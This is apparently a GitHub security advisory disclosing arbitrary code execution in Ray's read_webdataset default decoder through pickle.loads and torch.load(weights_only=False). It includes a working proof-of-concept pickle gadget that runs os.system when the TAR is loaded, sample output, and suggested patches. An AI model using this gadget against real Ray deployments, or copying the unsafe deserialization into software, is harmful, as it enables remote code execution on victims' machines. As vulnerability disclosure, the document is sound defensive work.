# [H] Ray: Arbitrary code execution via ray.data.read_webdataset default decoder: pickle.loads(value) and torch.load(weights_only=False)

## Summary
Severity: High
Advisory: GHSA-hhrp-gw25-jr43
CVE: CVE-2026-57516
CWE: CWE-502, CWE-94
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-07-24
Source: https://github.com/advisories/GHSA-hhrp-gw25-jr43
Type: github-advisory

## Affected
- PyPI: `ray` — affected >=0 <2.56.0

## Details
## Summary

`ray.data.read_webdataset(paths=...)` is a `@PublicAPI(stability="alpha")`
reader for WebDataset-format TAR files. Its default `decoder=True` invokes
`_default_decoder` on every sample's keys, which routes file extension to a
decoder by extension. Two of those branches deserialize attacker-controlled
bytes with no validation:

- `.pickle` / `.pkl` -> `pickle.loads(value)`
- `.pt`     / `.pth` -> `torch.load(io.BytesIO(value), weights_only=False)`

Both fire during a standard `ray.data.read_webdataset(...).take_all()` /
`.iter_batches()` call. No flags, no opt-in, no environment variable.
An attacker who can supply a TAR (via S3 share, HuggingFace Hub mirror,
email attachment, model-zoo, or any HTTP URL the user passes to
`read_webdataset`) achieves arbitrary code execution in the calling
Ray process at schema-sample time, before row data is consumed.

This is the same class of bug as GHSA-mw35-8rx3-xf9r (Parquet Arrow
Extension Type cloudpickle deserialization, patched in 2.55.0): standard
data-loading API, attacker-controlled file format, deserialization gadget
invoked transparently. The 2.55.0 patch addressed
`tensor_extensions/arrow.py:_deserialize_with_fallback` and made cloudpickle
opt-in via `RAY_DATA_AUTOLOAD_CLOUDPICKLE_TENSOR_METADATA=1`. The
WebDataset path is a different code site and was not touched.

## Vulnerable code (HEAD `a157d4d`)

`python/ray/data/_internal/datasource/webdataset_datasource.py` lines
175-225, the `_default_decoder` function:

```python
def _default_decoder(sample, format=True):
    sample = dict(sample)
    for key, value in sample.items():
        extension = key.split(".")[-1]
        ...
        elif extension in ["pt", "pth"]:
            import torch
            # PyTorch 2.6 changed torch.load default weights_only=True, which
            # breaks loading general Python objects previously serialized for
            # WebDataset .pt payloads.
            sample[key] = torch.load(io.BytesIO(value), weights_only=False)   # line 219
        elif extension in ["pickle", "pkl"]:
            import pickle
            sample[key] = pickle.loads(value)                                 # line 223
    return sample
```

The comment for the `.pt/.pth` branch is itself a security smell: it
documents that the maintainer chose `weights_only=False` *to override*
PyTorch 2.6's safer default. The comment treats this as a compatibility
fix; it functionally re-enables an arbitrary-code-execution path that
upstream PyTorch closed.

## Reachability and default-on confirmation

`python/ray/data/read_api.py:2289` defines `read_webdataset` with default
`decoder=True`:

```python
@PublicAPI(stability="alpha")
def read_webdataset(
    paths,
    *,
    ...
    decoder: Optional[Union[bool, str, callable, list]] = True,
    ...
) -> Dataset:
    ...
    datasource = WebDatasetDatasource(paths, decoder=decoder, ...)
```

`WebDatasetDatasource._read_stream` (line 367) calls the decoder
unconditionally when not None:

```python
for sample in samples:
    if self.decoder is not None:
        sample = _apply_list(self.decoder, sample, default=_default_decoder)
```

`True is not None` evaluates True, so the default decoder fires for every
invocation that doesn't explicitly pass `decoder=None` (or a custom safe
decoder). The documentation does not warn about the behavior.

## End-to-end reproduction

Tested on a fresh venv (`pip install ray[data]`) on Linux x86_64. Ray
reports `__version__ == "2.55.1"` (the patched-against-GHSA-mw35 release):

```python
import io, os, pickle, subprocess, tarfile, tempfile, sys

MARKER = "/tmp/ray_webdataset_poc_rce_marker"

class Gadget:
    def __reduce__(self):
        cmd = (f"/bin/sh -c \"printf 'RCE via ray.data.read_webdataset\\n"
               f"pid=%s\\nuser=%s\\n' \"$$\" \"$(whoami)\" > {MARKER}\"")
        return (os.system, (cmd,))

with tempfile.NamedTemporaryFile(suffix=".tar", delete=False) as f:
    tar_path = f.name
with tarfile.open(tar_path, "w") as tar:
    for name, body in (("000000.txt", b"hello"),
                       ("000000.pkl", pickle.dumps(Gadget()))):
        ti = tarfile.TarInfo(name=name); ti.size = len(body)
        tar.addfile(ti, io.BytesIO(body))

import ray, ray.data
ray.init(num_cpus=2, ignore_reinit_error=True, log_to_driver=False)
ds = ray.data.read_webdataset(paths=[tar_path])
rows = ds.take_all()
assert os.path.exists(MARKER), "no RCE"
print(open(MARKER).read())
```

Output:

```
ray version: 2.55.1
crafted /tmp/tmpjpos115h.tar (10240 bytes)
ds.take_all() returned 1 row(s)
RCE CONFIRMED:marker at /tmp/ray_webdataset_poc_rce_marker:
    RCE via ray.data.read_webdataset
    pid=248816
    user=xyz
```

The `.pt/.pth` variant is the exact same primitive against the
`torch.load(io.BytesIO(value), weights_only=False)` branch; replace the
TAR member with `000000.pt` containing `torch.save(Gadget())` to reproduce.

## Real-world delivery vectors

- `paths=["s3://bucket/poisoned.tar"]` -- the user thinks they are reading
  a WebDataset shard; the bucket is shared, mis-permissioned, or
  compromised.
- `paths=["https://attacker/model.tar"]` -- HTTP-served WebDataset.
- HuggingFace Hub -- WebDataset is a recognized HF dataset format; users
  pull TAR shards via `datasets` and feed them to Ray Data.
- Model-zoo / leaderboard tarballs -- common in CV/ASR workflows.

## Why GHSA-mw35 doesn't cover this

GHSA-mw35-8rx3-xf9r patched `tensor_extensions/arrow.py:_deserialize_with_fallback`
by gating `cloudpickle.loads` behind
`RAY_DATA_AUTOLOAD_CLOUDPICKLE_TENSOR_METADATA=1`. That change touches
the Parquet ExtensionType deserialization path only. The advisory text
does not mention WebDataset, the WebDataset code is in a different
module, and the unsafe loads here use `pickle.loads` and
`torch.load(weights_only=False)` (not `cloudpickle.loads`).

## Suggested patch

Two minimal options, both Ray-internal:

1. **Make the unsafe extensions opt-in**, mirroring the GHSA-mw35 fix
   pattern. Replace the `.pt/.pth` and `.pkl/.pickle` branches with a
   guard:

   ```python
   import os
   _ALLOW_UNSAFE = os.environ.get(
       "RAY_DATA_WEBDATASET_ALLOW_UNSAFE_PICKLE", "0"
   ) == "1"

   elif extension in ["pt", "pth"]:
       if not _ALLOW_UNSAFE:
           raise ValueError(
               f"Refusing to load .pt/.pth member {key!r} from WebDataset "
               f"with weights_only=False. Set "
               f"RAY_DATA_WEBDATASET_ALLOW_UNSAFE_PICKLE=1 only for trusted "
               f"sources."
           )
       sample[key] = torch.load(io.BytesIO(value), weights_only=False)

   elif extension in ["pickle", "pkl"]:
       if not _ALLOW_UNSAFE:
           raise ValueError(
               f"Refusing to unpickle WebDataset member {key!r} -- "
               f"untrusted pickle is RCE. Provide your own decoder "
               f"or set RAY_DATA_WEBDATASET_ALLOW_UNSAFE_PICKLE=1 for "
               f"trusted sources."
           )
       sample[key] = pickle.loads(value)
   ```

2. **Drop these branches from the default decoder entirely** and require
   callers to provide their own decoder when working with .pkl/.pt
   samples. This is the safer default, matches WebDataset upstream's
   guidance ("by default, use safe decoders"), and is consistent with
   the spirit of the GHSA-mw35 patch.

Either option flips the default-on RCE primitive into an explicit
opt-in. The current default-on behavior provides no signal to users
that calling `ray.data.read_webdataset` on an untrusted TAR is
equivalent to running attacker code.

## References

- Source: `python/ray/data/_internal/datasource/webdataset_datasource.py:175-225`
- Public API: `python/ray/data/read_api.py:2287-2370` (`read_webdataset`)
- Sibling advisory of the same class: GHSA-mw35-8rx3-xf9r (Parquet
  Arrow Extension Type, patched 2.55.0)
- Earlier related advisory: PR #45084 (2024) fixed PyExtensionType
  cloudpickle but did not touch the WebDataset decoder.
- WebDataset format: https://github.com/webdataset/webdataset

## References
- https://github.com/ray-project/ray/security/advisories/GHSA-hhrp-gw25-jr43
- https://nvd.nist.gov/vuln/detail/CVE-2026-57516
- https://github.com/ray-project/ray/pull/63469
- https://github.com/ray-project/ray/pull/63470
- https://github.com/ray-project/ray/commit/41443a18f9e6403a072de69098a279c23e2d943c
- https://github.com/pypa/advisory-database/tree/main/vulns/ray/PYSEC-2026-2273.yaml
- https://github.com/ray-project/ray
- https://github.com/ray-project/ray/releases/tag/ray-2.56.0
- https://www.vulncheck.com/advisories/ray-unsafe-deserialization-rce-via-webdataset-reader
